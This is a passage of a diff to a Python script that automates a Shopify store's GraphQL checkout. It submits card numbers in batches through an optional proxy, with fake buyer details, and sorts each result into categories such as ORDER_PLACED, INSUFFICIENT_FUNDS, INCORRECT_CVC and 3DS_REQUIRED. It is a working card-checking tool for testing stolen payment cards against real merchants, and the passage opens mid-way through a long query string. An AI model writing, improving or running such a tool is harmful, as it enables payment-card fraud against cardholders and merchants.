ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{handle}}}}__typename}fragment ProposalDetails on Proposal{delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{handle}}}}__typename}fragment DiscountDetailsFragment on Discount{...on CodeDiscount{code __typename}...on AutomaticDiscount{title __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name __typename}',
             'variables': {
                 'input': {
                     'sessionInput': {
-                        'sessionToken': session_token,
+                        'sessionToken': x_checkout_one_session_token,
                     },
                     'queueToken': queue_token,
                     'discounts': {
@@ -630,7 +553,7 @@ async def shopify_checkout(url, card, session):
                                         },
                                     },
                                     'options': {
-                                        'phone': addr["phone"],
+                                        'phone': '12195154586',
                                     },
                                 },
                                 'targetMerchandiseLines': {
@@ -641,12 +564,12 @@ async def shopify_checkout(url, card, session):
                                     ],
                                 },
                                 'deliveryMethodTypes': [
-                                    delivery_method_type,
+                                    f'{DMT}' if DMT else 'SHIPPING',
                                 ],
                                 'expectedTotalPrice': {
                                     'value': {
-                                        'amount': f'{shipping_amount}',
-                                        'currencyCode': f'{currency_code}',
+                                        'amount': f'{amount}',
+                                        'currencyCode': f'{currencyCode}',
                                     },
                                 },
                                 'destinationChanged': False,
@@ -681,7 +604,7 @@ async def shopify_checkout(url, card, session):
                                 'expectedTotalPrice': {
                                     'value': {
                                         'amount': f'{price}',
-                                        'currencyCode': f'{currency_code}',
+                                        'currencyCode': f'{currencyCode}',
                                     },
                                 },
                                 'lineComponentsSource': None,
@@ -700,16 +623,16 @@ async def shopify_checkout(url, card, session):
                             {
                                 'paymentMethod': {
                                     'directPaymentMethod': {
-                                        'paymentMethodIdentifier': payment_method_id,
-                                        'sessionId': session_id,
+                                        'paymentMethodIdentifier': paymentMethodIdentifier,
+                                        'sessionId': sessionid,
                                         'billingAddress': {
                                             'streetAddress': {
                                                 'address1': addr["address1"],
                                                 'city': addr["city"],
                                                 'countryCode': addr["countryCode"],
                                                 'postalCode': addr["postalCode"],
-                                                'firstName': first_name,
-                                                'lastName': last_name,
+                                                'firstName': 'Laka',
+                                                'lastName': 'Lama',
                                                 'zoneCode': addr["zoneCode"],
                                                 'phone': addr["phone"],
                                             },
@@ -734,7 +657,7 @@ async def shopify_checkout(url, card, session):
                                 'amount': {
                                     'value': {
                                         'amount': f'{total}',
-                                        'currencyCode': f'{currency_code}',
+                                        'currencyCode': f'{currencyCode}',
                                     },
                                 },
                             },
@@ -745,8 +668,8 @@ async def shopify_checkout(url, card, session):
                                 'city': addr["city"],
                                 'countryCode': addr["countryCode"],
                                 'postalCode': addr["postalCode"],
-                                'firstName': first_name,
-                                'lastName': last_name,
+                                'firstName': 'Laka',
+                                'lastName': 'Lama',
                                 'zoneCode': addr["zoneCode"],
                                 'phone': addr["phone"],
                             },
@@ -754,15 +677,15 @@ async def shopify_checkout(url, card, session):
                     },
                     'buyerIdentity': {
                         'customer': {
-                            'presentmentCurrency': f'{currency_code}',
-                            'countryCode': f'{country_code}',
+                            'presentmentCurrency': f'{currencyCode}',
+                            'countryCode': f'{countryCode}',
                         },
-                        'email': email,
+                        'email': 'genmahuha@gmail.com',
                         'emailChanged': False,
-                        'phoneCountryCode': f'{country_code}',
+                        'phoneCountryCode': f'{countryCode}',
                         'marketingConsent': [],
                         'shopPayOptInPhone': {
-                            'countryCode': f'{country_code}',
+                            'countryCode': f'{countryCode}',
                         },
                         'rememberMe': False,
                     },
@@ -774,7 +697,7 @@ async def shopify_checkout(url, card, session):
                         'proposedTotalAmount': {
                             'value': {
                                 'amount': f'{ttax}',
-                                'currencyCode': f'{currency_code}',
+                                'currencyCode': f'{currencyCode}',
                             },
                         },
                         'proposedTotalIncludedAmount': None,
@@ -801,102 +724,57 @@ async def shopify_checkout(url, card, session):
                     },
                     'cartMetafields': [],
                 },
-                'attemptToken': f'{source_token}-{random.randint(10000, 99999)}',
+                'attemptToken': f'{token}-4j33p1vmcd5',
                 'metafields': [],
                 'analytics': {
                     'requestUrl': checkout_url,
-                    'pageId': f'{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999):012X}',
+                    'pageId': '0cde623b-7B13-4911-E150-61A3736179ED',
                 },
             },
             'operationName': 'SubmitForCompletion',
         }
+
+        # Get receipt ID from first submission
+        request = await session.post(f'{url}/checkouts/unstable/graphql', params=params, headers=headers, json=json_data)
         
-        request = await session.post(
-            f'{url}/checkouts/unstable/graphql',
-            params={'operationName': 'SubmitForCompletion'},
-            headers=graphql_headers,
-            json=submit_data,
-            timeout=30.0
-        )
-        
-        # Check for receipt ID and poll
-        receipt_id = None
         try:
-            resp_json = request.json()
-            receipt_data = resp_json.get("data", {}).get("submitForCompletion", {})
-            
-            # Try to get receipt from different paths
-            if "receipt" in receipt_data:
-                receipt_id = receipt_data["receipt"].get("id")
-            elif receipt_data.get("__typename") == "SubmittedForCompletion":
-                receipt_id = receipt_data.get("receipt", {}).get("id")
-        except Exception:
-            pass
-            
-        # Step 8: Poll for receipt
+            resp_data = request.json()
+            receipt_id = resp_data.get("data", {}).get("submitForCompletion", {}).get("receipt", {}).get("id")
+        except:
+            receipt_id = None
+
+        # Poll for receipt
         if receipt_id:
-            print(f"[*] Polling for result...")
+            poll_params = {
+                'operationName': 'PollForReceipt'
+            }
             
-            poll_query = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId sessionToken:$sessionToken){...on ProcessedReceipt{id token orderStatusPageUrl}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{url}...on CompletePaymentChallengeV2{challengeType challengeData}}}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}'
-            
-            poll_data = {
-                'query': poll_query,
+            poll_json_data = {
+                'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId sessionToken:$sessionToken){...on ProcessedReceipt{id token redirectUrl orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}}',
                 'variables': {
                     'receiptId': receipt_id,
-                    'sessionToken': session_token,
+                    'sessionToken': x_checkout_one_session_token,
                 },
                 'operationName': 'PollForReceipt',
             }
-            
-            for i in range(3):
-                await asyncio.sleep(3)
-                request = await session.post(
-                    f'{url}/checkouts/unstable/graphql',
-                    params={'operationName': 'PollForReceipt'},
-                    headers=graphql_headers,
-                    json=poll_data,
-                    timeout=20.0
-                )
-                
-                if "WaitingReceipt" not in request.text and "ProcessingReceipt" not in request.text:
-                    break
-                    
-        # Parse final response
-        res_text = request.text
+
+            for i in range(2):
+                request = await session.post(f'{url}/checkouts/unstable/graphql', params=poll_params, headers=headers, json=poll_json_data)
+                if i == 1:
+                    pass  
+                else:
+                    await asyncio.sleep(3)
         
-        try:
-            res_json = request.json()
-        except Exception:
-            res_json = {}
-            
-        end_time = time.time()
-        print(f"[*] Time taken: {end_time - start_time:.2f}s")
-        
-        # Extract error code
-        result = None
-        try:
-            result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
-        except Exception:
-            pass
-            
-        if not result:
-            try:
-                result = res_json.get('data', {}).get('submitForCompletion', {}).get('receipt', {}).get('processingError', {}).get('code')
-            except Exception:
-                pass
-                
-        # Parse response and return appropriate result
-        if "shopify_payments" in res_text.lower() or "ProcessedReceipt" in res_text:
+        end = time.time()
+        timetaken = end - start
+        print(f"Time taken: {timetaken:.2f}s")
+
+        res_json = json.loads(request.text)
+        result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
+
+        if "shopify_payments" in str(res_json):
             output.update({
                 "Response": "ORDER_PLACED",
-                "Status": True,
-                "Gateway": gateway,
-                "Price": total,
-                "cc": card
-            })
-        elif "CompletePaymentChallenge" in res_text or "ActionRequiredReceipt" in res_text:
-            output.update({
-                "Response": "3DS_REQUIRED",
                 "Status": True,
                 "Gateway": gateway,
                 "Price": total,
@@ -934,7 +812,7 @@ async def shopify_checkout(url, card, session):
                 "Price": total,
                 "cc": card
             })
-        elif "FRAUD_SUSPECTED" in res_text:
+        elif "FRAUD_SUSPECTED" in str(res_json):
             output.update({
                 "Response": "FRAUD_SUSPECTED",
                 "Status": True,
@@ -942,7 +820,7 @@ async def shopify_checkout(url, card, session):
                 "Price": total,
                 "cc": card
             })
-        elif "INCORRECT_ADDRESS" in res_text:
+        elif "INCORRECT_ADDRESS" in str(res_json):
             output.update({
                 "Response": "INCORRECT_ADDRESS",
                 "Status": True,
@@ -950,7 +828,7 @@ async def shopify_checkout(url, card, session):
                 "Price": total,
                 "cc": card
             })
-        elif "INCORRECT_ZIP" in res_text:
+        elif "INCORRECT_ZIP" in str(res_json):
             output.update({
                 "Response": "INCORRECT_ZIP",
                 "Status": True,
@@ -958,7 +836,7 @@ async def shopify_checkout(url, card, session):
                 "Price": total,
                 "cc": card
             })
-        elif "INCORRECT_PIN" in res_text:
+        elif "INCORRECT_PIN" in str(res_json):
             output.update({
                 "Response": "INCORRECT_PIN",
                 "Status": True,
@@ -966,7 +844,7 @@ async def shopify_checkout(url, card, session):
                 "Price": total,
                 "cc": card
             })
-        elif "insufficient_funds" in res_text.lower() or "INSUFFICIENT_FUNDS" in res_text:
+        elif "insufficient_funds" in str(res_json).lower():
             output.update({
                 "Response": "INSUFFICIENT_FUNDS",
                 "Status": True,
@@ -974,7 +852,7 @@ async def shopify_checkout(url, card, session):
                 "Price": total,
                 "cc": card
             })
-        elif "INVALID_CVC" in res_text or "INCORRECT_CVC" in res_text:
+        elif "INVALID_CVC" in str(res_json) or "INCORRECT_CVC" in str(res_json):
             output.update({
                 "Response": "INCORRECT_CVC",
                 "Status": True,
@@ -982,7 +860,15 @@ async def shopify_checkout(url, card, session):
                 "Price": total,
                 "cc": card
             })
-        elif "EXPIRED_CARD" in res_text:
+        elif "CompletePaymentChallenge" in str(res_json):
+            output.update({
+                "Response": "3DS_REQUIRED",
+                "Status": True,
+                "Gateway": gateway,
+                "Price": total,
+                "cc": card
+            })
+        elif "EXPIRED_CARD" in str(res_json):
             output.update({
                 "Response": "EXPIRED_CARD",
                 "Status": True,
@@ -990,7 +876,7 @@ async def shopify_checkout(url, card, session):
                 "Price": total,
                 "cc": card
             })
-        elif "DO_NOT_HONOR" in res_text:
+        elif "DO_NOT_HONOR" in str(res_json):
             output.update({
                 "Response": "DO_NOT_HONOR",
                 "Status": True,
@@ -1008,134 +894,28 @@ async def shopify_checkout(url, card, session):
             })
         else:
             output.update({
-                "Response": "UNKNOWN_RESPONSE",
+                "Response": result,
                 "Status": True,
                 "Gateway": gateway,
                 "Price": total,
                 "cc": card
             })
-            
+
     except Exception as e:
         output.update({
-            "Response": f"ERROR: {str(e)}",
+            "Response": str(e),
             "Status": False,
         })
-        
+
+    print(json.dumps(output))
     return output
 
 
-def print_banner():
-    """Print application banner"""
-    print("=" * 60)
-    print(" SHOPIFY TERMINAL - GraphQL Checkout ".center(60))
-    print("=" * 60)
-    print()
-
-
-def print_result(result, card_masked):
-    """Print formatted result"""
-    status_icon = "[+]" if result.get("Status") else "[-]"
-    response = result.get("Response", "UNKNOWN")
-    gateway = result.get("Gateway", "Unknown")
-    price = result.get("Price", 0)
-    
-    print()
-    print("-" * 60)
-    print(f"{status_icon} Card: {card_masked}")
-    print(f"{status_icon} Response: {response}")
-    print(f"{status_icon} Gateway: {gateway}")
-    print(f"{status_icon} Price: ${price:.2f}" if isinstance(price, (int, float)) else f"{status_icon} Price: {price}")
-    print("-" * 60)
-
-
-async def process_cards(url, cards, proxy=None):
-    """Process multiple cards"""
-    # Configure httpx client
-    if proxy:
-        transport = httpx.AsyncHTTPTransport(proxy=proxy)
-        session = httpx.AsyncClient(transport=transport, timeout=30.0, follow_redirects=True)
-    else:
-        session = httpx.AsyncClient(timeout=30.0, follow_redirects=True)
-        
-    async with session:
-        for idx, card in enumerate(cards, 1):
-            card = card.strip()
-            if not card or '|' not in card:
-                continue
-                
-            parts = card.split('|')
-            if len(parts) != 4:
-                print(f"[{idx}] Invalid card format: {card}")
-                continue
-                
-            cc = parts[0]
-            card_masked = f"{cc[:6]}******{cc[-4:]}|{parts[1]}|{parts[2]}|{parts[3]}"
-            
-            print()
-            print(f"[{idx}/{len(cards)}] Processing: {card_masked}")
-            
-            result = await shopify_checkout(url, card, session)
-            print_result(result, card_masked)
-            
-            # Output as JSON for programmatic use
-            print(f"JSON: {json.dumps(result)}")
-            
-            # Wait between cards
-            if idx < len(cards):
-                await asyncio.sleep(2)
-
-
-async def main():
-    """Main entry point"""
-    print_banner()
-    
-    # Get website URL
-    url = input("[?] Enter Shopify website URL: ").strip()
-    if not url:
-        print("[-] No URL provided!")
-        return
-        
-    # Get proxy (optional)
-    use_proxy = input("[?] Use proxy? (y/n): ").strip().lower()
-    proxy = None
-    if use_proxy == 'y':
-        proxy = input("[?] Enter proxy (http://ip:port or http://user:pass@ip:port): ").strip()
-        
-    # Get cards
-    print()
-    print("=" * 60)
-    print(" Enter cards in format: xxxxxxxxxxxxxxxx|MM|YY|CVV")
-    print(" Type 'done' when finished")
-    print("=" * 60)
-    print()
-    
-    cards = []
-    while True:
-        card = input("[+] Card: ").strip()
-        if card.lower() == 'done':
-            break
-        if card:
-            cards.append(card)
-            
-    if not cards:
-        print("[-] No cards entered!")
-        return
-        
-    print()
-    print(f"[*] Starting check for {len(cards)} card(s)...")
-    
-    await process_cards(url, cards, proxy)
-    
-    print()
-    print("=" * 60)
-    print(" CHECK COMPLETE ".center(60))
-    print("=" * 60)
-
-
-if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\n\n[!] Stopped by user")
-    except Exception as e:
-        print(f"\n[!] Fatal error: {str(e)}")
+# Example usage:
+# async def main():
+#     async with httpx.AsyncClient() as session:
+#         result = await autoshopify("https://example.com", "4111111111111111|12|25|123", session)
+#         print(result)
+#
+# if __name__ == "__main__":
+#     asyncio.run(main())
